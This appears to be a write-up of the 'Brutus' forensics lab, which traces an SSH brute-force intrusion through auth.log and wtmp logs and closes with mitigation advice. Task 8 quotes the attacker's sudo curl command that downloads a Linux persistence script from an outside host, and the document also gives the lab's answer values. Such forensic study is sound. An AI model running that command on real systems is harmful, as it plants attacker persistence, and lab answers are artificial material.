#  🕵️ Brutus Lab Investigation

## Task 1: Identify the Attacker's IP Address

- **IP Address Used by the Attacker**: `65.2.161.68`
- The attacker used this IP address to carry out a brute force attack, which can be seen in the logs.

![Brute-Force Logs](https://imgur.com/YRqEdFH.png)  
*Ref 1: `auth.log` showing brute-force attempts from attacker IP `65.2.161.68`*  

---

## Task 2: Identifying the Compromised Account

- **Compromised Account**: `root`
- The attacker successfully gained access to this account after multiple failed login attempts.

![Successful Login Entry](https://imgur.com/Qy2pA10.png)  
*Ref 2: Attacker successfully logged in as `root`*

---

## Task 3: Identify the Timestamp of Attacker's Manual Login

- **Login Time**: `2024-03-06 06:32:45`
- The login time is found in the `wtmp` artifact, and it is different from the authentication time.

![Attacker's Login Time](https://imgur.com/n3ygooB.png)  
*Ref 3: `wtmp` logs showing manual attacker login at `06:32:45`*

---

## Task 4: Identifying the Session Number

- **Session Number**: `37`
- SSH login sessions are tracked and assigned a session number. This session number corresponds to the attacker's session for the user account `root`.

![Session Number](https://imgur.com/bI9FQp9.png)  
*Ref 4: Session `37` assigned to the attacker's login*

---

## Task 5: Discovering the Attacker's Persistence Strategy

- **Backdoor Account Created by the Attacker**: `cyberjunkie`
- The attacker added this new user account as part of their persistence strategy on the server and gave it higher privileges.

![New User Creation](https://imgur.com/VlVnkQ6.png)  
*Ref 5: Attacker-created account `cyberjunkie` for persistence*

---

## Task 6: MITRE ATT&CK Sub-Technique ID

- **MITRE ATT&CK Sub-Technique ID**: `T1136.001`
- The attacker used the **T1136.001** sub-technique for persistence by creating a new account, as part of their attack strategy.

![MITRE ATT&CK Reference](https://imgur.com/qvv8nWp.png)  
*Ref 6: MITRE ATT&CK framework reference for `T1136.001` – New Account Creation*

---

## Task 7: End Time of the Attacker's First SSH Session

- **Session End Time**: `2024-03-06 06:37:24`
- This timestamp corresponds to when the attacker's first SSH session ended, as noted in the `auth.log`.

![Attacker's Exit Log](https://i.imgur.com/SRnv3ha.png)
*Ref 7: `auth.log` showing the attacker’s session end time at `06:37:24`*

---

## Task 8: Full Command Executed by the Attacker Using Sudo

- **Command Executed**:  
  `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
- The attacker logged into their backdoor account and used `sudo` privileges to execute this command to download a script.

![Command Execution Log](https://imgur.com/AjfZGI4.png)  
*Ref 8: Command executed by the attacker using sudo to download the script*

---

### **Findings and Mitigation Steps:**

- **Attack Vector**: Brute-force attack via SSH (`auth.log` analysis)
- **Persistence Mechanism**: Created a new privileged backdoor user (`cyberjunkie`)
- **Mitigation Steps**:
  - **Enforce strong SSH authentication** (disable password logins, use key-based authentication)
  - **Enable fail2ban** to block brute-force attempts
  - **Monitor new user creations & privilege escalations**
  - **Analyze outbound connections** for malicious activity (`curl` downloads)

---

🚀 **This investigation provided hands-on experience in forensic log analysis, attacker tracking, and security hardening.**
